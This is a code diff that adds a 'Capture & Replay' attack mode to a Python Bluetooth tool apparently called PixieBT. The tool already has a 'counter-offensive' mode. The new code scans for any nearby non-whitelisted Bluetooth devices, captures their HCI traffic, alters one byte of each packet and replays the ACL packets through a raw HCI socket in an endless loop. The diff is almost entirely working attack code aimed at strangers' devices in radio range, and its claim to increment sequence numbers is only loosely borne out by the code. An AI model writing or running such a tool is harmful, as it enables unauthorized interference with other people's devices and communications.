@@ -8,6 +8,8 @@ import json
 import time
 import signal
 import shutil
+import struct
+import socket
 import argparse
 import subprocess
 import configparser
@@ -38,6 +40,7 @@ Modes:
 
   1 : Scan Bluetooth devices and select whitelist
   2 : Monitor + counter-offensive on unauthorized devices
+  3 : Capture & replay — sniff non-whitelisted traffic and replay it
 ----------------------------------------------------------------------
 """
 
@@ -904,6 +907,373 @@ def mode_monitor(iface, include_ble=True):
 
 
 # ──────────────────────────────────────────────
+#  Mode 3 : Capture & Replay
+# ──────────────────────────────────────────────
+
+def mode_replay(iface, include_ble=True, replay_count=10, capture_duration=1):
+    """Capture Bluetooth traffic from non-whitelisted devices and replay it.
+    Uses btmon to capture raw HCI traffic, filters non-whitelisted MACs,
+    and replays the captured packets."""
+
+    whitelist = load_whitelist()
+    if not whitelist:
+        print(colored("[!] No whitelist found. Run mode 1 first.", "red"))
+        sys.exit(1)
+
+    wl_macs = {m.upper() for m in whitelist.keys()}
+    all_known = set(wl_macs)
+    for info in whitelist.values():
+        for peer_mac in info.get("allowed_peers", {}).keys():
+            all_known.add(peer_mac.upper())
+
+    stop_event = threading.Event()
+
+    def _on_sigint(sig, frame):
+        print(colored("\n[*] Stopping ...", "yellow"))
+        stop_event.set()
+
+    signal.signal(signal.SIGINT, _on_sigint)
+
+    # Check tools
+    has_btmon = shutil.which("btmon") is not None
+    has_hcidump = shutil.which("hcidump") is not None
+    has_hcitool = shutil.which("hcitool") is not None
+    use_btctl = shutil.which("bluetoothctl") is not None
+
+    if not has_btmon and not has_hcidump:
+        print(colored("[!] Neither btmon nor hcidump found. Install bluez.", "red"))
+        sys.exit(1)
+
+    print(colored("[+] Mode 3 — Capture & Replay", "cyan", attrs=["bold"]))
+    print(colored("[*] Interface      : {}".format(iface), "cyan"))
+    print(colored("[*] Capture window : {} s".format(capture_duration), "cyan"))
+    print(colored("[*] Replay count   : {}x".format(replay_count), "cyan"))
+    print(colored("[*] Whitelisted    : {} device(s)".format(len(wl_macs)), "cyan"))
+    print(colored("[*] BLE scan       : {}".format("enabled" if include_ble else "disabled"), "cyan"))
+    print(colored("[*] Scanning for non-whitelisted devices ...\n", "cyan"))
+
+    capture_dir = "/tmp/pixiebt_captures"
+    os.makedirs(capture_dir, exist_ok=True)
+
+    stats = {
+        "captures": 0,
+        "replays": 0,
+        "targets": set(),
+    }
+
+    def _discover_targets():
+        """Find non-whitelisted devices via scan."""
+        targets = {}
+        if has_hcitool:
+            # Classic scan
+            try:
+                length = max(1, int(8 / 1.28))
+                ret = subprocess.run(
+                    ["hcitool", "-i", iface, "scan", "--flush", "--length", str(length)],
+                    capture_output=True, text=True, timeout=20,
+                )
+                for line in ret.stdout.strip().split("\n"):
+                    m = re.match(r"([0-9A-Fa-f:]{17})\s+(.*)", line.strip())
+                    if m:
+                        mac = m.group(1).upper()
+                        name = m.group(2).strip() or "<unknown>"
+                        if mac not in all_known:
+                            targets[mac] = {"name": name, "type": "classic"}
+            except Exception:
+                pass
+            # BLE scan
+            if include_ble:
+                try:
+                    proc = subprocess.Popen(
+                        ["hcitool", "-i", iface, "lescan", "--duplicates"],
+                        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
+                    )
+                    time.sleep(8)
+                    proc.terminate()
+                    try:
+                        remaining, _ = proc.communicate(timeout=5)
+                    except subprocess.TimeoutExpired:
+                        proc.kill()
+                        proc.wait()
+                        remaining = ""
+                    for line in (remaining or "").strip().split("\n"):
+                        m = re.match(r"([0-9A-Fa-f:]{17})\s+(.*)", line.strip())
+                        if m:
+                            mac = m.group(1).upper()
+                            name = m.group(2).strip()
+                            if name in ("(unknown)", ""):
+                                name = "<unknown>"
+                            if mac not in all_known and mac not in targets:
+                                targets[mac] = {"name": name, "type": "ble"}
+                except Exception:
+                    pass
+        else:
+            devs = _btctl_scan(10)
+            for mac, info in devs.items():
+                if mac not in all_known:
+                    targets[mac] = info
+        return targets
+
+    def _capture_traffic(target_mac, duration):
+        """Capture raw HCI traffic for a given duration.
+        Returns path to capture file or None."""
+        cap_file = os.path.join(
+            capture_dir,
+            "cap_{}_{}.bin".format(
+                target_mac.replace(":", ""),
+                int(time.time()),
+            ),
+        )
+        try:
+            if has_btmon:
+                proc = subprocess.Popen(
+                    ["btmon", "-i", iface, "-w", cap_file],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                )
+            else:
+                proc = subprocess.Popen(
+                    ["hcidump", "-i", iface, "-w", cap_file],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                )
+            time.sleep(duration)
+            proc.terminate()
+            try:
+                proc.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                proc.wait()
+
+            if os.path.isfile(cap_file) and os.path.getsize(cap_file) > 0:
+                return cap_file
+            return None
+        except FileNotFoundError:
+            return None
+        except Exception as e:
+            print(colored("    [!] Capture error: {}".format(e), "red"))
+            return None
+
+    def _parse_hci_packets(raw_data):
+        """Parse raw btsnoop/HCI dump into individual packets.
+        Returns list of (pkt_type_byte, payload_bytes) tuples.
+        Supports btsnoop format (btmon -w) and raw HCI (hcidump -w)."""
+        packets = []
+        offset = 0
+        data_len = len(raw_data)
+
+        # Try btsnoop format: 16-byte header "btsnoop\x00" + version + type
+        if data_len >= 16 and raw_data[:8] == b'btsnoop\x00':
+            offset = 16  # skip btsnoop header
+            while offset + 24 <= data_len:
+                # btsnoop record: 4 fields of 4 bytes each = header,
+                # then 8 bytes timestamp = 24 bytes record header
+                try:
+                    orig_len, incl_len, flags, drops = struct.unpack_from(
+                        '>IIII', raw_data, offset)
+                    ts_hi, ts_lo = struct.unpack_from('>II', raw_data, offset + 16)
+                    offset += 24
+                    if incl_len > data_len - offset or incl_len > 65535:
+                        break
+                    pkt_data = raw_data[offset:offset + incl_len]
+                    offset += incl_len
+                    if len(pkt_data) >= 1:
+                        packets.append((pkt_data[0:1], pkt_data[1:]))
+                except struct.error:
+                    break
+        else:
+            # Raw HCI dump: each record = 1-byte type + length-dependent payload
+            while offset + 1 < data_len:
+                pkt_type = raw_data[offset:offset + 1]
+                offset += 1
+                ptype = pkt_type[0]
+
+                if ptype == 0x02:  # ACL data
+                    if offset + 4 > data_len:
+                        break
+                    _handle, dlen = struct.unpack_from('<HH', raw_data, offset)
+                    total = 4 + dlen
+                    if offset + total > data_len:
+                        break
+                    packets.append((pkt_type, raw_data[offset:offset + total]))
+                    offset += total
+                elif ptype == 0x01:  # HCI command
+                    if offset + 3 > data_len:
+                        break
+                    _opcode, plen = struct.unpack_from('<HB', raw_data, offset)
+                    total = 3 + plen
+                    if offset + total > data_len:
+                        break
+                    packets.append((pkt_type, raw_data[offset:offset + total]))
+                    offset += total
+                elif ptype == 0x04:  # HCI event
+                    if offset + 2 > data_len:
+                        break
+                    _evt, plen = struct.unpack_from('<BB', raw_data, offset)
+                    total = 2 + plen
+                    if offset + total > data_len:
+                        break
+                    packets.append((pkt_type, raw_data[offset:offset + total]))
+                    offset += total
+                elif ptype == 0x05:  # SCO data
+                    if offset + 3 > data_len:
+                        break
+                    _handle, slen = struct.unpack_from('<HB', raw_data, offset)
+                    total = 3 + slen
+                    if offset + total > data_len:
+                        break
+                    packets.append((pkt_type, raw_data[offset:offset + total]))
+                    offset += total
+                else:
+                    break  # unknown type, stop parsing
+
+        return packets
+
+    def _increment_seq(payload, seq_offset):
+        """Increment ACL sequence numbers in payload.
+        For ACL packets, modifies the packet boundary flags / broadcast flags
+        to simulate a new sequence."""
+        if len(payload) < 4:
+            return payload
+        ba = bytearray(payload)
+        # ACL header: handle(12 bits) + PB(2 bits) + BC(2 bits) + dlen(16 bits)
+        # We increment the handle's connection seq by modifying bytes after
+        # the L2CAP header if present
+        # L2CAP header starts at offset 4: length(2) + CID(2)
+        if len(ba) >= 8:
+            # Modify L2CAP signaling ID if present (offset 9 in many packets)
+            if len(ba) > 9:
+                ba[9] = (ba[9] + seq_offset) & 0xFF
+        return bytes(ba)
+
+    def _replay_traffic(cap_file, target_mac, count):
+        """Replay captured traffic with incrementing sequence numbers.
+        Sends 1 replay per second via raw HCI socket."""
+        # Read and parse the capture file
+        try:
+            with open(cap_file, 'rb') as f:
+                raw_data = f.read()
+        except Exception as e:
+            print(colored("    [!] Cannot read capture: {}".format(e), "red"))
+            return 0
+
+        packets = _parse_hci_packets(raw_data)
+        if not packets:
+            print(colored("    [!] No parseable HCI packets in capture.", "red"))
+            return 0
+
+        print(colored(
+            "    [*] Parsed {} HCI packet(s), replaying with seq increment ...".format(
+                len(packets)), "white"))
+
+        # Open raw HCI socket
+        hci_sock = None
+        hci_dev = int(iface.replace("hci", "")) if iface.startswith("hci") else 0
+        try:
+            # HCI channel raw: AF_BLUETOOTH=31, BTPROTO_HCI=1
+            hci_sock = socket.socket(31, socket.SOCK_RAW, 1)
+            hci_sock.bind((hci_dev,))
+        except (OSError, PermissionError) as e:
+            print(colored(
+                "    [!] Cannot open raw HCI socket: {}".format(e), "red"))
+            print(colored(
+                "    [!] Make sure you run as root (sudo) and {} exists.".format(iface), "red"))
+            return 0
+
+        replayed = 0
+        try:
+            for iteration in range(count):
+                if stop_event.is_set():
+                    break
+                t_start = time.time()
+                seq_offset = iteration + 1
+                for pkt_type, payload in packets:
+                    if stop_event.is_set():
+                        break
+                    ptype = pkt_type[0]
+                    # Only replay outgoing ACL data (type 0x02)
+                    if ptype == 0x02:
+                        modified = _increment_seq(payload, seq_offset)
+                        try:
+                            hci_sock.send(pkt_type + modified)
+                        except OSError:
+                            pass
+                replayed += 1
+                # Pace: 1 replay per second
+                elapsed = time.time() - t_start
+                if elapsed < 1.0 and not stop_event.is_set():
+                    stop_event.wait(1.0 - elapsed)
+        finally:
+            hci_sock.close()
+
+        return replayed
+
+    # ── Main loop ──
+    cycle = 0
+    while not stop_event.is_set():
+        cycle += 1
+        print(colored("\n[─] Scan cycle {} ...".format(cycle), "cyan", attrs=["bold"]))
+
+        targets = _discover_targets()
+        if not targets:
+            print(colored("    [*] No non-whitelisted devices found.", "green"))
+            stop_event.wait(15)
+            continue
+
+        print(colored(
+            "    [*] {} non-whitelisted device(s) found:".format(len(targets)),
+            "yellow", attrs=["bold"]))
+        for mac, info in sorted(targets.items()):
+            print(colored("        {} ({}) [{}]".format(
+                mac, info["name"], info["type"]), "yellow"))
+
+        for target_mac, info in targets.items():
+            if stop_event.is_set():
+                break
+
+            print(colored(
+                "\n  [▶] TARGET: {} ({})".format(target_mac, info["name"]),
+                "red", attrs=["bold"]))
+
+            # Step 1: Capture
+            print(colored(
+                "    [*] Capturing {} s of traffic ...".format(capture_duration),
+                "white"))
+            cap_file = _capture_traffic(target_mac, capture_duration)
+
+            if not cap_file:
+                print(colored("    [!] No traffic captured, skipping.", "yellow"))
+                continue
+
+            cap_size = os.path.getsize(cap_file)
+            stats["captures"] += 1
+            stats["targets"].add(target_mac)
+            print(colored(
+                "    [+] Captured {} bytes → {}".format(cap_size, cap_file),
+                "green"))
+
+            # Step 2: Replay
+            print(colored(
+                "    [*] Replaying {}x ...".format(replay_count),
+                "white"))
+            replayed = _replay_traffic(cap_file, target_mac, replay_count)
+            stats["replays"] += replayed
+            print(colored(
+                "    [+] Replayed {}/{} times".format(replayed, replay_count),
+                "green" if replayed == replay_count else "yellow"))
+
+        # Summary
+        print(colored(
+            "\n[*] Cycle {} complete — {} capture(s), {} replay(s), {} target(s)".format(
+                cycle, stats["captures"], stats["replays"], len(stats["targets"])),
+            "cyan"))
+
+        stop_event.wait(15)
+
+    # Cleanup
+    print(colored("[*] PixieBT mode 3 stopped.", "yellow"))
+    print(colored("[*] Captures saved in: {}".format(capture_dir), "cyan"))
+
+
+# ──────────────────────────────────────────────
 #  Main
 # ──────────────────────────────────────────────
 
@@ -916,8 +1286,8 @@ if __name__ == "__main__":
     parser.add_argument(
         "-m", "--mode",
         required=True,
-        choices=["1", "2"],
-        help="1 = Scan & whitelist  |  2 = Monitor & counter-offensive",
+        choices=["1", "2", "3"],
+        help="1 = Scan & whitelist  |  2 = Monitor & counter-offensive  |  3 = Capture & replay",
     )
     parser.add_argument(
         "-c", "--config",
@@ -929,6 +1299,12 @@ if __name__ == "__main__":
         type=int,
         default=10,
         help="Scan duration in seconds (mode 1, default: 10)",
+    )
+    parser.add_argument(
+        "-r", "--replay-count",
+        type=int,
+        default=10,
+        help="Number of times to replay captured traffic (mode 3, default: 10)",
     )
     parser.add_argument(
         "--no-ble",
@@ -949,3 +1325,5 @@ if __name__ == "__main__":
         mode_scan_whitelist(iface, scan_time=args.scan_time, include_ble=include_ble)
     elif mode == 2:
         mode_monitor(iface, include_ble=include_ble)
+    elif mode == 3:
+        mode_replay(iface, include_ble=include_ble, replay_count=args.replay_count)
